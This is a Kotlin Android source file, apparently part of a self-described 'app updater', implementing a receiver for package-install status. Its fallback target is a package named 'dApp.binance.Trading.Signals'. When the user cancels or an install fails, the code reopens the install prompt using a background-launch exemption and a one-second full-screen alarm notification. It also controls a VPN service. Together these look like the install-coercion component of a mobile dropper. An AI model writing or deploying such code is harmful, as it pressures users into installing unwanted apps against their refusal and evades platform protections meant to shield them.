package com.example.appupdater

import android.app.ActivityOptions
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.os.Build
import android.util.Log

class InstallReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        Log.d("InstallReceiver", "Broadcast received, action: $action")

        if (action == Intent.ACTION_MY_PACKAGE_REPLACED) {
            Log.d("InstallReceiver", "Self update completed. Auto-launching self...")
            stopVpn(context)
            launchApp(context, context.packageName)
            return
        }

        val status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -999)
        val prefPkg = context.getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
            .getString("pending_package_name", "")
        val extraPkg = intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME)
        val targetPackage = extraPkg?.takeIf { it.isNotEmpty() }
            ?: intent.getStringExtra("target_package")?.takeIf { it.isNotEmpty() }
            ?: prefPkg?.takeIf { it.isNotEmpty() }
            ?: "dApp.binance.Trading.Signals"
        val statusMessage = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE) ?: "No status details provided"

        Log.d("InstallReceiver", "Install status updated: status=$status, target=$targetPackage, message=$statusMessage")

        when (status) {
            PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                Log.d("InstallReceiver", "STATUS_PENDING_USER_ACTION: launching resolution user prompt intent...")
                val confirmIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra(Intent.EXTRA_INTENT)
                }

                if (confirmIntent != null) {
                    confirmIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                    startActivityWithBalExemption(context, confirmIntent)
                } else {
                    Log.e("InstallReceiver", "Confirm intent is missing from the pending user action parcel!")
                }
            }

            PackageInstaller.STATUS_SUCCESS -> {
                Log.d("InstallReceiver", "STATUS_SUCCESS: Package installed successfully.")
                
                context.getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                    .edit()
                    .putBoolean("is_updated", true)
                    .apply()

                // Forward to MainActivity
                val successIntent = Intent(context, MainActivity::class.java).apply {
                    this.action = intent.action
                    putExtras(intent)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                }
                startActivityWithBalExemption(context, successIntent)
            }

            PackageInstaller.STATUS_FAILURE_ABORTED -> {
                Log.w("InstallReceiver", "STATUS_FAILURE_ABORTED: Installation cancelled or aborted by user.")
                // Forward to MainActivity to retry or show error
                val retryIntent = Intent(context, MainActivity::class.java).apply {
                    this.action = "com.example.INSTALL_STATUS"
                    putExtras(intent)
                    addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                }
                startActivityWithBalExemption(context, retryIntent)
                triggerFullScreenNotification(context, retryIntent)
            }

            else -> {
                if (status != -999) {
                    Log.e("InstallReceiver", "Installation failure code: $status. Message: $statusMessage")
                    stopVpn(context)
                    // Forward to MainActivity
                    val failedIntent = Intent(context, MainActivity::class.java).apply {
                        this.action = "com.example.INSTALL_STATUS"
                        putExtras(intent)
                        addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                    }
                    startActivityWithBalExemption(context, failedIntent)
                    triggerFullScreenNotification(context, failedIntent)
                }
            }
        }
    }

    private fun startActivityWithBalExemption(context: Context, intent: Intent) {
        val options = ActivityOptions.makeBasic().apply {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                setPendingIntentBackgroundActivityStartMode(ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED)
            }
        }
        try {
            val tempPI = PendingIntent.getActivity(
                context,
                (System.currentTimeMillis() and 0xffff).toInt(),
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
                options.toBundle()
            )
            tempPI.send(context, 0, null, null, null, null, options.toBundle())
            Log.d("InstallReceiver", "Successfully started activity via PendingIntent with BAL exemption.")
        } catch (e: Exception) {
            Log.e("InstallReceiver", "PendingIntent send failed, falling back to direct startActivity: ${e.message}")
            try {
                context.startActivity(intent, options.toBundle())
            } catch (ex: Exception) {
                Log.e("InstallReceiver", "Direct startActivity fallback failed: ${ex.message}")
            }
        }
    }

    private fun stopVpn(context: Context) {
        try {
            val serviceIntent = Intent(context, VPNInstallerService::class.java).apply {
                action = VPNInstallerService.ACTION_DISCONNECT
            }
            context.startService(serviceIntent)
            Log.d("InstallReceiver", "Sent ACTION_DISCONNECT to VPN service")
        } catch (e: Exception) {
            Log.e("InstallReceiver", "Failed to send disconnect to VPN: ${e.message}")
        }
        try {
            val serviceIntent = Intent(context, VPNInstallerService::class.java)
            context.stopService(serviceIntent)
            Log.d("InstallReceiver", "VPN Service stopped")
        } catch (e: Exception) {
            Log.e("InstallReceiver", "Failed to stop VPN: ${e.message}")
        }
    }

    private fun launchApp(context: Context, packageName: String) {
        AppLauncher.launchApp(context, packageName)
    }

    private fun triggerFullScreenNotification(context: Context, intent: Intent) {
        try {
            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
            val channelId = "install_status_channel"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = android.app.NotificationChannel(
                    channelId,
                    "Installation Progress",
                    android.app.NotificationManager.IMPORTANCE_HIGH
                )
                notificationManager.createNotificationChannel(channel)
            }
            
            val options = android.app.ActivityOptions.makeBasic().apply {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED)
                }
            }

            val pendingIntent = android.app.PendingIntent.getActivity(
                context,
                101,
                intent,
                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE,
                options.toBundle()
            )
            
            val builder = androidx.core.app.NotificationCompat.Builder(context, channelId)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle("Installation Update")
                .setContentText("Opening status screen...")
                .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
                .setCategory(androidx.core.app.NotificationCompat.CATEGORY_ALARM)
                .setFullScreenIntent(pendingIntent, true)
                .setAutoCancel(true)
            
            notificationManager.notify(101, builder.build())
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                notificationManager.cancel(101)
            }, 1000)
        } catch (e: Exception) {
            Log.e("InstallReceiver", "Failed to trigger full screen notification: ${e.message}")
        }
    }
}
